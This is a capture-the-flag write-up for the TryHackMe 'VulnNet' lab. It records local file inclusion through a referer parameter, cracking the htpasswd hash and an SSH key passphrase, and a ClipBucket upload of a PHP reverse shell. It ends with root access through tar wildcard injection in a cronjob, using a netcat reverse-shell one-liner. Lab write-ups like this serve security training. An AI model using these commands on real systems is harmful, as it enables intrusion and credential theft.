# VulnNet

Category: Web
Difficulty: Medium
Platform: TryHackMe
Status: In progress
Tags: Linux, php, priv-esc, web

***TABLE OF CONTENTS:***

**[Intro](https://www.notion.so/VulnNet-680bc1f85ea44f2885993afb73ecddae)**

**[recon & enum](https://www.notion.so/VulnNet-680bc1f85ea44f2885993afb73ecddae)**

**[Explotation](https://www.notion.so/VulnNet-680bc1f85ea44f2885993afb73ecddae)**

**[Privilege Escalation](https://www.notion.so/VulnNet-680bc1f85ea44f2885993afb73ecddae)**

**[Flags](https://www.notion.so/VulnNet-680bc1f85ea44f2885993afb73ecddae)**

**[Imporved skill](https://www.notion.so/VulnNet-680bc1f85ea44f2885993afb73ecddae)**

**[Used tools](https://www.notion.so/VulnNet-680bc1f85ea44f2885993afb73ecddae)**

---

# Intro:

- **Difficulty: Medium**
- **Web Language: PHP**
- **HTTPServer: Ubuntu Linux**
- **Version: Apache/2.4.29**
- **IP: 10.10.137.3**

# Recon & Enum:

- **RustScan**
    
    ```
    ┌──(nazu㉿Nazu)-[~/Desktop/CTF/THM-CTF/VulnNet]
    └─$ sudo rustscan -a 10.10.137.3 0-20000 -- -sC -sV
    .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
    | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
    | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
    `-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
    The Modern Day Port Scanner.
    ________________________________________
    : https://discord.gg/GFrQsGy           :
    : https://github.com/RustScan/RustScan :
     --------------------------------------
    😵 https://admin.tryhackme.com
    
    Open 10.10.137.3:22
    Open 10.10.137.3:80
    [~] Starting Script(s)
    [>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
    
    PORT   STATE SERVICE REASON         VERSION
    22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 eac9e867760a3f9709a7d7a663adc12c (RSA)
    | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwkZ4lon+5ZNgVQmItwLRcbDT9QrJJGvPrfqsbAnwk4dgPz1GDjIg+RwRIZIwPGRPpyvd01W1vh0BNs7Uh9f5RVuojlLxjqsN1876Jvt5Ma7ajC49lzxmtI8B5Vmwxx9cRA8JBvENm0+BTsDjpaj3JWllRffhD25Az/F1Tz3fSua1GiR7R2eEKSMrD38+QGG22AlrCNHvunCJkPmYH9LObHq9uSZ5PbJmqR3Yl3SJarCZ6zsKBG5Ka/xJL17QUB5o6ZRHgpw/pmw+JKWUkodIwPe4hCVH0dQkfVAATjlx9JXH95h4EPmKPvZuqHZyGUPE5jPiaNg6YCNCtexw5Wo41
    |   256 0fc8f6d38e4cea67476884dc1c2b2e34 (ECDSA)
    | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBA8L+SEmXtvfURdTRsmhaay/VJTFJzXYlU/0uKlPAtdpyZ8qaI55EQYPwcPMIbvyYtZM37Bypg0Uf7Sa8i1aTKk=
    |   256 055399fc9810b5c368006c2941daa5c9 (ED25519)
    |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKNuqHl39hJpIduBG9J7QwetpgO1PWQSUDL/rvjXPiWw
    80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
    |_http-favicon: Unknown favicon MD5: 8B7969B10EDA5D739468F4D3F2296496
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    | http-methods: 
    |_  Supported Methods: GET HEAD POST OPTIONS
    |_http-title: VulnNet
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    ```
    

- **Fuzzing Dir (not intersting)**
    
    ```
    ┌──(nazu㉿Nazu)-[~/Desktop/CTF/THM-CTF/VulnNet]
    └─$ sudo dirb http://vulnnet.thm/
    -----------------
    DIRB v2.22    
    By The Dark Raver
    -----------------
    
    START_TIME: Fri Jan 27 10:54:41 2023
    URL_BASE: http://vulnnet.thm/
    WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
    
    -----------------
    
    GENERATED WORDS: 4612                                                          
    
    ---- Scanning URL: http://vulnnet.thm/ ----
    ==> DIRECTORY: http://vulnnet.thm/css/                                                                                                                                
    ==> DIRECTORY: http://vulnnet.thm/fonts/                                                                                                                              
    ==> DIRECTORY: http://vulnnet.thm/img/                                                                                                                                
    + http://vulnnet.thm/index.php (CODE:200|SIZE:5829)                                                                                                                   
    ==> DIRECTORY: http://vulnnet.thm/js/
    ```
    

- **Fuzzing Sub-domain**
    
    ```
    ┌──(nazu㉿Nazu)-[~/Desktop/CTF/THM-CTF/VulnNet]
    └─$ knockpy vulnnet.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
    ==> broadcast.vulnnet.thm
    ```
    
    **Unauthorized.so we have to scan our main domain**
    
    - **like before we check source code**
    - **cert**
    - **domin under a domain at least 4 times**
    - **and also fuzzing our broadcast.vulnnet.thm for hidden dir and urls.**
    
    **You can use burp suite😈**
    

# Exploitation:

On js file `[http://vulnnet.thm/js/index__d8338055.js](http://vulnnet.thm/js/index__d8338055.js)` we found this:

- `http://vulnnet.thm/index.php?referer="` ⇒ Referer is an HTTP header field that identifies the address of the webpage ex. the URI that linked to the resource being requested.
- so let’s try to inject someting on it. we know our target is linux. that means we must use linux stuff things
- in this case i used ****[LFI Linux WordList](https://github.com/DragonJAR/Security-Wordlist/blob/main/LFI-WordList-Linux) from sec list.**
- **Boom we found this💣**
    
    `view-source:[http://vulnnet.thm/index.php?referer=/etc/passwd](http://vulnnet.thm/index.php?referer=/etc/passwd)`
    
    ```
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
    systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
    syslog:x:102:106::/home/syslog:/usr/sbin/nologin
    messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
    _apt:x:104:65534::/nonexistent:/usr/sbin/nologin
    uuidd:x:105:111::/run/uuidd:/usr/sbin/nologin
    lightdm:x:106:113:Light Display Manager:/var/lib/lightdm:/bin/false
    whoopsie:x:107:117::/nonexistent:/bin/false
    kernoops:x:108:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
    pulse:x:109:119:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
    avahi:x:110:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
    hplip:x:111:7:HPLIP system user,,,:/var/run/hplip:/bin/false
    server-management:x:1000:1000:server-management,,,:/home/server-management:/bin/bash
    mysql:x:112:123:MySQL Server,,,:/nonexistent:/bin/false
    sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
    ```
    
    > **/etc/passwd is a text file in Linux that stores information about the users on the system, such as their login, user ID number, directory.**
    > 
- `view-source:[http://vulnnet.thm/index.php?referer=/etc/apache2/sites-enabled/000-default.conf](http://vulnnet.thm/index.php?referer=/etc/apache2/sites-enabled/000-default.conf)` on this URL we found some cool informations😈
    
    ```html
    <VirtualHost *:80>
    	ServerAdmin webmaster@localhost
    	ServerName vulnnet.thm
    	DocumentRoot /var/www/main
    	ErrorLog ${APACHE_LOG_DIR}/error.log
    	CustomLog ${APACHE_LOG_DIR}/access.log combined
    	<Directory /var/www/main>
    		Order allow,deny
    		allow from all
    	</Directory>
    </VirtualHost>
    
    <VirtualHost *:80>
    	ServerAdmin webmaster@localhost
    	ServerName broadcast.vulnnet.thm
    	DocumentRoot /var/www/html
    	ErrorLog ${APACHE_LOG_DIR}/error.log
    	CustomLog ${APACHE_LOG_DIR}/access.log combined
    	<Directory /var/www/html>
    		Order allow,deny
    		allow from all
    		AuthType Basic
    		AuthName "Restricted Content"
    		AuthUserFile /etc/apache2/.htpasswd
    		Require valid-user
    	</Directory>
    </VirtualHost>
    ```
    
- `**view-source:[http://vulnnet.thm/index.php?referer=/etc/apache2/.htpasswd](http://vulnnet.thm/index.php?referer=/etc/apache2/.htpasswd)` on this URL we found usernma with hashed password ⇒ `developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0`**
- **so let’s crack using `john`**
    
    ```html
    ┌──(nazu㉿Nazu)-[~/Desktop/CTF/THM-CTF/VulnNet]
    └─$ echo "developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0" > hash.txt
    
    ┌──(nazu㉿Nazu)-[~/Desktop/CTF/THM-CTF/VulnNet]
    └─$ john --wordlist=/home/nazu/Desktop/Word-List/rockyou.txt hash.txt
    pass => 9972761drmfsls
    user => developers
    ```
    
    **it’s not ssh password and username. it used for brodcast subdomain**
    
    **boom we logged in.** 
    
    **the first step is checking for source code.**
    
    **on line 190 we found this** `<!-- ClipBucket version 4.0 -->` **there are so many exploits on this versiiion [here](https://www.google.com/search?client=firefox-b-e&q=clipbucket+version+4.0+exploit)’**
    
    ```html
    ┌──(nazu㉿Nazu)-[~/Desktop/CTF/THM-CTF/VulnNet]
    └─$ searchsploit ClipBucket 4.0
    ------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
     Exploit Title                                                                                                                       |  Path
    ------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
    ClipBucket < 4.0.0 - Release 4902 - Command Injection / File Upload / SQL Injection                                                  | php/webapps/44250.txt
    ClipBucket < 4.0.0 - Release 4902 - Command Injection / File Upload / SQL Injection                                                  | php/webapps/44250.txt
    
    ┌──(nazu㉿Nazu)-[~/Desktop/CTF/THM-CTF/VulnNet]
    └─$ locate php/webapps/44250.txt
    /usr/share/exploitdb/exploits/php/webapps/44250.txt
                                                                                                                                                                           
    ┌──(nazu㉿Nazu)-[~/Desktop/CTF/THM-CTF/VulnNet]
    └─$ cp /usr/share/exploitdb/exploits/php/webapps/44250.txt ~/Desktop/CTF/THM-CTF/VulnNet/click.txt
                                                                                                                                                                           
    ┌──(nazu㉿Nazu)-[~/Desktop/CTF/THM-CTF/VulnNet]
    └─$ ls                          
    click.txt  hash.txt  knockpy_report
    ```
    
    > ClipBucket is an open source **video sharing platform** that allows users to **upload**, share, and manage their videos. It is written in PHP and uses MySQL for its database. It also includes a wide range of features such as user management, video conversion, video embedding, and more.
    > 
    
    **So to get reverse shell we have to explot File Upload Vuln [| curl](https://t.me/mrnazu/626)**
    
    ```html
    2. Unauthenticated Arbitrary File Upload
    Below is the cURL request to upload arbitrary files to the webserver with no
    authentication required.
    
    $ curl -F "file=@pfile.php" -F "plupload=1" -F "name=anyname.php"
    "http://$HOST/actions/beats_uploader.php"
    
    $ curl -F "file=@pfile.php" -F "plupload=1" -F "name=anyname.php"
    "http://$HOST/actions/photo_uploader.php"
    ```
    
    - [x]  PHP Reverse shell
    - [x]  net cat to lestion
    
    ```html
    ┌──(nazu㉿Nazu)-[~/Desktop/CTF/THM-CTF/VulnNet]
    └─$ curl -u developers:9972761drmfsls -F "file=@reverse.php" -F "plupload=1" -F "name=reverse.php" "http://broadcast.vulnnet.thm/actions/beats_uploader.php" creating file{"success":"yes","file_name":"165752453575eede","extension":"php","file_directory":"CB_BEATS_UPLOAD_DIR"}
    ```
    

**then go to ⇒ [`http://broadcast.vulnnet.thm/actions/CB_BEATS_UPLOAD_DIR/`](http://broadcast.vulnnet.thm/actions/CB_BEATS_UPLOAD_DIR/) then click and open ur reversh shell**

```html
┌──(nazu㉿Nazu)-[~/Desktop/CTF/THM-CTF/VulnNet]
└─$ nc -lvlp 1234
listening on [any] 1234 ...
connect to [10.18.29.75] from vulnnet.thm [10.10.76.135] 55184
Linux vulnnet 4.15.0-134-generic #138-Ubuntu SMP Fri Jan 15 10:52:18 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 18:52:45 up 4 min,  0 users,  load average: 0.27, 1.21, 0.66
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
```

# Privilege Escalation:

### cronjob:

> A cron job is a command or script that is **scheduled** to run at a specified time or interval. The cron job is usually set up using the crontab command, which allows users to edit their cron table (crontab) and define commands to run periodically on a given schedule.
> 
> 
> To create a cron job, you must first edit your crontab file using the command:
> `crontab -e`
> 
> This will open an editor where you can enter your desired commands and specify when they should be executed
> 

> Cronjob Privilege Escalation is a type of priv esc that exploits vulnerabilities arising from inadequate control of privileged stored procedures used to schedule jobs such as cronjobs on Linux systems.
> 

> For example of a Cronjob Privilege Escalation can be seen when a user with low privileges is able to configure a cronjob which is executed by root, which will elevate the user’s privileges. For example, consider a vulnerable system that allows unprivileged users to execute any program owned by the root user. If an attacker manages to insert a malicious script in the crontab entry, the script will be executed with root privileges and can effectively take control of the system resulting in privilege escalation.
> 

```html
$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/2   * * * *   root    /var/opt/backupsrv.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

**That means we are allwed to run `backupsrv.sh`😈**

```html
$ cat /var/opt/backupsrv.sh
#!/bin/bash

# Where to backup to.
dest="/var/backups"

# What to backup. 
cd /home/server-management/Documents
backup_files="*"

# Create archive filename.
day=$(date +%A)
hostname=$(hostname -s)
archive_file="$hostname-$day.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"
date
echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"
date

# Long listing of files in $dest to check file sizes.
ls -lh $dest
```

> **This script is used to create a backup of the files in the /home/server-management/ Documents directory.**
> 

**But we can’t🥶**

```html
$ /var/opt/backupsrv.sh
/bin/sh: 4: /var/opt/backupsrv.sh: Permission denied
```

- So let’s find allowed file
    - `find / -type f -user server-management 2>/dev/null`
    - `/var/backups/ssh-backup.tar.gz` | let’s copy this file to our dir
    - `cp /var/backups/ssh-backup.tar.gz /var/www/html/actions/CB_BEATS_UPLOAD_DIR/ssh-backup.tar.gz`
- Then we download it! ⇒ [`http://broadcast.vulnnet.thm/actions/CB_BEATS_UPLOAD_DIR/`](http://broadcast.vulnnet.thm/actions/CB_BEATS_UPLOAD_DIR/)
- when we extract it, it will give us `id_rsa` file. seems intersting!

```html
┌──(nazu㉿Nazu)-[~/Desktop/CTF/THM-CTF/VulnNet]
└─$ ssh2john id_rsa > id_rsa.txt 
                                                                                                                                                                       
┌──(nazu㉿Nazu)-[~/Desktop/CTF/THM-CTF/VulnNet]
└─$ locate rockyou.txt          
/home/nazu/Desktop/Word-List/rockyou.txt
/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz
/usr/share/wordlists/rockyou.txt.gz

┌──(nazu㉿Nazu)-[~/Desktop/CTF/THM-CTF/VulnNet]
└─$ john --wordlist=/home/nazu/Desktop/Word-List/rockyou.txt id_rsa.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
oneTWO3gOyac     (id_rsa)     
1g 0:00:00:09 DONE (2023-01-27 13:21) 0.1049g/s 514941p/s 514941c/s 514941C/s one_0012..one98t7
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

### SSH Login with this password

```html
┌──(nazu㉿Nazu)-[~/Desktop/CTF/THM-CTF/VulnNet]
└─$ ssh -i id_rsa server-management@10.10.76.135
The authenticity of host '10.10.76.135 (10.10.76.135)' can't be established.
ED25519 key fingerprint is SHA256:GgnSIc02m6P4YfjO6UVJaykCDYShjpPCn/B4+fzh+4k.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:61: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.76.135' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-134-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

560 packages can be updated.
359 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

server-management@vulnnet:~$
```

```html
server-management@vulnnet:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
server-management@vulnnet:~$ cat user.txt
THM{907e420d979d8e2992f3d7e16bee1e8b}
```

### Now, time to escalate our privilege to root to get root flag via `cronjob!`

[GTFBins](https://gtfobins.github.io/gtfobins/tar/)

- `echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.29.75 4444 >/tmp/f" > /home/server-management/Documents/rev.sh`
- `touch "/home/server-management/Documents/--checkpoint=1"`
- `touch "/home/server-management/Documents/--checkpoint-action=exec=sh rev.sh"`

```html
nc -nlvp 4444
listening on [any] 4444 ...
# cat /root/root.txt
THM{220b671dd8adc301b34c2738ee8295ba}
```

# Flags:

- user.txt
    - THM{907e420d979d8e2992f3d7e16bee1e8b}
- root.txt
    - THM{220b671dd8adc301b34c2738ee8295ba}

---

## Improved skills

- cronjob
- prv esc

## Used tools

- rustscan
- dirb
- knockpy
- subfinder
- jhon
- dev tool
- netcat
- searchsploit
- sec list
- gtfobins

# Spen time = 4 hour
